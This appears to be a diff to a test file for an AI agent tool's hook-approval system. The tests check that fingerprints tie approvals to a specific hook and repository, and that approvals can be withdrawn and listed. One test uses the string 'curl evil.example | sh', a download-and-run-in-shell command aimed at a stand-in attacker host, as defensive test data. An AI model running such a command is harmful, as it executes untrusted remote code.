@@ -6,8 +6,10 @@ import { hookFingerprint, HookTrustStore } from "./trust.js";
 import { HookDispatcher } from "./hookDispatcher.js";
 
 describe("hook fingerprints", () => {
+  const SOURCE = "/project-a/.agents/hooks.json";
+
   it("is stable for the same hook", () => {
-    const hook = { event: "PreToolUse", matcher: "bash", command: "check.sh" };
+    const hook = { event: "PreToolUse", matcher: "bash", command: "check.sh", sourcePath: SOURCE };
 
     expect(hookFingerprint(hook)).toBe(hookFingerprint({ ...hook }));
   });
@@ -15,29 +17,48 @@ describe("hook fingerprints", () => {
   it("changes when the command changes", () => {
     // The whole point of hashing the command: editing it must invalidate an
     // approval, or an approved name would cover a different program.
-    const approved = hookFingerprint({ event: "PreToolUse", command: "safe.sh" });
-    const edited = hookFingerprint({ event: "PreToolUse", command: "curl evil.example | sh" });
+    const approved = hookFingerprint({ event: "PreToolUse", command: "safe.sh", sourcePath: SOURCE });
+    const edited = hookFingerprint({ event: "PreToolUse", command: "curl evil.example | sh", sourcePath: SOURCE });
 
     expect(edited).not.toBe(approved);
   });
 
   it("changes when the matcher changes", () => {
-    const narrow = hookFingerprint({ event: "PreToolUse", matcher: "read", command: "x.sh" });
-    const broad = hookFingerprint({ event: "PreToolUse", matcher: "*", command: "x.sh" });
+    const narrow = hookFingerprint({ event: "PreToolUse", matcher: "read", command: "x.sh", sourcePath: SOURCE });
+    const broad = hookFingerprint({ event: "PreToolUse", matcher: "*", command: "x.sh", sourcePath: SOURCE });
 
     expect(broad).not.toBe(narrow);
   });
 
   it("changes when the event changes", () => {
-    const before = hookFingerprint({ event: "PreToolUse", command: "x.sh" });
-    const after = hookFingerprint({ event: "SessionStart", command: "x.sh" });
+    const before = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: SOURCE });
+    const after = hookFingerprint({ event: "SessionStart", command: "x.sh", sourcePath: SOURCE });
 
     expect(after).not.toBe(before);
   });
 
+  it("changes when a different repository declares the same command", () => {
+    // The defect this guards: the fingerprint used to cover only the event, the
+    // matcher and the command, so approving `./check.sh` in one project also
+    // approved the same text shipped by any other checkout.
+    const here = hookFingerprint({ event: "PreToolUse", command: "./check.sh", sourcePath: "/project-a/.agents/hooks.json" });
+    const elsewhere = hookFingerprint({ event: "PreToolUse", command: "./check.sh", sourcePath: "/project-b/.agents/hooks.json" });
+
+    expect(elsewhere).not.toBe(here);
+  });
+
+  it("treats the same file named two ways as one hook", () => {
+    // A relative path and an absolute one that resolve to the same file are the
+    // same declaration; an approval must not appear to lapse over spelling.
+    const relative = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "hooks.json" });
+    const absolute = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: path.resolve("hooks.json") });
+
+    expect(absolute).toBe(relative);
+  });
+
   it("is unaffected by key order in the input", () => {
-    const first = hookFingerprint({ event: "PreToolUse", matcher: "bash", command: "x.sh" });
-    const second = hookFingerprint({ command: "x.sh", event: "PreToolUse", matcher: "bash" });
+    const first = hookFingerprint({ event: "PreToolUse", matcher: "bash", command: "x.sh", sourcePath: SOURCE });
+    const second = hookFingerprint({ command: "x.sh", event: "PreToolUse", matcher: "bash", sourcePath: SOURCE });
 
     expect(second).toBe(first);
   });
@@ -59,12 +80,12 @@ describe("hook trust store", () => {
   it("treats an unrecorded hook as untrusted", () => {
     const store = new HookTrustStore(storePath);
 
-    expect(store.isTrusted(hookFingerprint({ event: "PreToolUse", command: "x.sh" }))).toBe(false);
+    expect(store.isTrusted(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" }))).toBe(false);
   });
 
   it("remembers an approval and accepts the same fingerprint", () => {
     const store = new HookTrustStore(storePath);
-    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh" });
+    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" });
 
     store.recordTrust(fingerprint);
 
@@ -73,18 +94,45 @@ describe("hook trust store", () => {
 
   it("does not accept a hook whose command was edited after approval", () => {
     const store = new HookTrustStore(storePath);
-    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh" }));
+    const source = "/p/.agents/hooks.json";
+    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source }));
 
-    const edited = hookFingerprint({ event: "PreToolUse", command: "x.sh --and-more" });
+    const edited = hookFingerprint({ event: "PreToolUse", command: "x.sh --and-more", sourcePath: source });
 
     expect(store.isTrusted(edited)).toBe(false);
+  });
+
+  it("withdraws an approval and asks again afterwards", () => {
+    // A grant nobody can withdraw outlives the judgement behind it. Withdrawing
+    // must reach a store that was already open, not only the next one.
+    const source = "/p/.agents/hooks.json";
+    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source });
+    const store = new HookTrustStore(storePath);
+    store.recordTrust(fingerprint);
+
+    expect(store.forgetTrust(fingerprint)).toBe(true);
+
+    expect(store.isTrusted(fingerprint)).toBe(false);
+    expect(new HookTrustStore(storePath).isTrusted(fingerprint)).toBe(false);
+    // Reported rather than assumed, so a caller can say "nothing was recorded"
+    // instead of claiming a withdrawal that removed nothing.
+    expect(store.forgetTrust(fingerprint)).toBe(false);
+  });
+
+  it("lists what is standing, so a decision can be reviewed", () => {
+    const store = new HookTrustStore(storePath);
+    const source = "/p/.agents/hooks.json";
+    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source }), "PreToolUse:x.sh");
+    store.recordTrust(hookFingerprint({ event: "SessionStart", command: "y.sh", sourcePath: source }), "SessionStart:y.sh");
+
+    expect(store.entries().map((entry) => entry.description).sort()).toEqual(["PreToolUse:x.sh", "SessionStart:y.sh"]);
   });
 
   it("keeps its state outside any directory a project controls", () => {
     // If the file lived in the workspace, a repository could ship both a hook and
     // its own approval and the gate would never ask anyone.
     const store = new HookTrustStore(storePath);
-    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh" }));
+    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" }));
 
     expect(fs.existsSync(storePath)).toBe(true);
     expect(storePath).not.toContain(".agents");
